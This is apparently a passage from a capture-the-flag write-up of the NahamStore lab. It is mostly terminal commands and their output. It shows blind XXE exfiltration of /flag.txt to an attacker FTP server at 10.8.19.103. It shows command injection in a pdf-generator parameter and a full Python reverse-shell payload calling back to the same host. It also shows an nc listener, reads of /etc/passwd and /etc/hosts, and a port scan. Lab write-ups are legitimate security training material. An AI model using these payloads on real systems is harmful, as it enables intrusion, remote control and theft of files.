+//cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAxOjEwMTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDI6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMzoxMDQ6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwNDoxMDU6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4K
+SIZE
+MDTM
+USER:  anonymous
+PASS:  anonymous
+SIZE
+PASV
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAxOjEwMTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDI6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMzoxMDQ6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwNDoxMDU6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4K" | base64 -d
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:102:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:103:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:104:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+
+we did it now get the flag
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ cat xxe.dtd
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.8.19.103:2121/%d;'>">
+
+upload it again
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ ./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000
+ [*] Storing session into the file: files.log
+ [*] Starting Web Server on 8000 [public]
+[*] No certificate files found in directory. Generating new...
+[*] UNO Listening...
+[*] Certificate files generated
+ [*] GO XXE FTP Server - Port:  2121
+ [*] Connection Accepted from [10.10.202.146:33530]
+ [x] Connection Closed
+ [*] Closing FTP Connection
+ [*] Connection Accepted from [10.10.202.146:33532]
+ [x] Connection Closed
+ [*] Closing FTP Connection
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.202.146 - - [22/Mar/2023 20:26:06] "GET /xxe.dtd HTTP/1.0" 200
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ cat files.log 
+USER:  anonymous
+PASS:  anonymous
+//e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=
+SIZE
+MDTM
+USER:  anonymous
+PASS:  anonymous
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ echo "e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=" | base64 -d 
+{d6b22cb3e37bef32d800105b11107d8f}
+```
+![[Pasted image 20230322192737.png]]
+XXE Flag
+*{9f18bd8b9acaada53c4c643744401ea8}*
+Blind XXE Flag
+*{d6b22cb3e37bef32d800105b11107d8f}*
+### RCE
+Find ways to run commands on the webserver. You'll find the flags in /flag.txt
+Answer the questions below
+```text
+POST /pdf-generator HTTP/1.1
+what=order&id=4;whoami
+
+Cannot find order: 4;whoami
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ w'h'o'am'i
+witty
+
+encode url
+
+what=order&id=4%3bw'h'o'am'i
+
+not work
+
+&& , ; , $() , ||, ` (maybe Blind RCE)
+
+what=order&id=4$(whoami)
+
+Cannot find order: 4www-data
+
+I did it, let's get flag then a revshell
+
+what=order&id=4$(ls)
+
+Cannot find order: 4cssindex.phpjsrobots.txtuploads
+
+what=order&id=4$(find / -type f -name flag.txt 2>/dev/null)
+
+Cannot find order: 4/lfi/flag.txt/flag.txt
+
+now getting a revshell
+
+what=order&id=4$(which python3)
+
+Cannot find order: 4/usr/bin/python3
+
+what=order&id=4$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
+
+another way
+
+what=order&id=4`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ rlwrap nc -lvnp 1338                                     
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.250.217] 33706
+www-data@2431fe29a4b0:~/html/public$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:104:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:105:106::/nonexistent:/usr/sbin/nologin
+
+www-data@2431fe29a4b0:~/html/public$ cat /lfi/flag.txt
+cat /lfi/flag.txt
+www-data@2431fe29a4b0:~/html/public$ cat /flag.txt
+cat /flag.txt
+{93125e2a845a38c3e1531f72c250e676}
+www-data@2431fe29a4b0:~/html/public$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.17.0.3	2431fe29a4b0
+127.0.0.1       nahamstore.thm
+127.0.0.1       www.nahamstore.thm
+172.17.0.1      stock.nahamstore.thm
+172.17.0.1      marketing.nahamstore.thm
+172.17.0.1      shop.nahamstore.thm
+172.17.0.1      nahamstore-2020.nahamstore.thm
+172.17.0.1      nahamstore-2020-dev.nahamstore.thm
+10.131.104.72   internal-api.nahamstore.thm
+
+like we found doing permutations using altdns and other tools
+
+Let's look for another RCE
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ rustscan -a 10.10.250.217 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/witty/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.250.217:22
+Open 10.10.250.217:80
+Open 10.10.250.217:8000
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+[~] Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Connect Scan
+Scanning something.nahamstore.thm (10.10.250.217) [3 ports]
+Discovered open port 22/tcp on 10.10.250.217
+Discovered open port 80/tcp on 10.10.250.217
+Discovered open port 8000/tcp on 10.10.250.217
+Completed Connect Scan (3 total ports)
+Initiating Service scan
+Scanning 3 services on something.nahamstore.thm (10.10.250.217)
+Completed Service scan (3 services on 1 host)
+NSE: Script scanning 10.10.250.217.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for something.nahamstore.thm (10.10.250.217)
+Host is up, received user-set (0.19s latency).
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 846e52cadb9edf0aaeb5703d07d69178 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
+|   256 1a1ddbca998a64b18b10dfa939d55cd3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
+|   256 f63616b7668e7b350907cb90c9846338 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
+80/tcp   open  http    syn-ack nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: NahamStore - Setup Your Hosts File
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-favicon: Unknown favicon MD5: 4208E33E7C9F713ECD7816EDE3B3F454
+8000/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/admin
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds
+
+| http-robots.txt: 1 disallowed entry 
+|_/admin let's see it :)
